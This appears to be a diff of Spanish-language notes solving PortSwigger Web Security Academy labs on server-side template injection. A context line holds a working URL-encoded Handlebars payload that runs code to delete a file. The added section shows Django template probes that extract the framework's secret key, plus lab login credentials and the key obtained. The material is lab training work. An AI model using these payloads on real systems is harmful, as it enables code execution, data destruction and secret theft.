@@ -1153,7 +1153,17 @@ Luego basta con encodear el mismo y enviarlo como valor del parámetro message.
 
 Ir a LABID.web-security-academy.net/?message=wrtz{{%23with "s" as |string|}}%0A%20 {{%23with "e"}}%0A%20%20%20 {{%23with split as |conslist|}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{this.push (lookup string.sub "constructor")}}%0A%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20 {{%23with string.split as |codelist|}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{this.push "return require('fs').unlinkSync('%2Fhome%2Fcarlos%2Fmorale.txt')%3B"}}%0A%20%20%20%20%20%20%20 {{this.pop}}%0A%20%20%20%20%20%20%20 {{%23each conslist}}%0A%20%20%20%20%20%20%20%20%20 {{%23with (string.sub.apply 0 codelist)}}%0A%20%20%20%20%20%20%20%20%20%20%20 {{this}}%0A%20%20%20%20%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20%20%20%20%20 {{%2Feach}}%0A%20%20%20%20%20 {{%2Fwith}}%0A%20%20%20 {{%2Fwith}}%0A%20 {{%2Fwith}}%0A{{%2Fwith}}
 
----
+### [Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)
+
+#### Descripción
+
+1. Iniciar sesión con las credenciales brindadas (content-manager:C0nt3ntM4n4g3r)
+2. Editar la descripción de un producto, ingresar {{7+'7'}} para obtener un error, determinando así que se está utilizando Django
+3. Ingresar {{settings.SECRET_KEY}} para obtener la secret key del framework
+
+#### Solución encontrada:
+
+## ce7yt92pn5jo8evzdf6hpmi144g0e9zd
 
 ## [Directory traversal](https://portswigger.net/web-security/file-path-traversal)
 
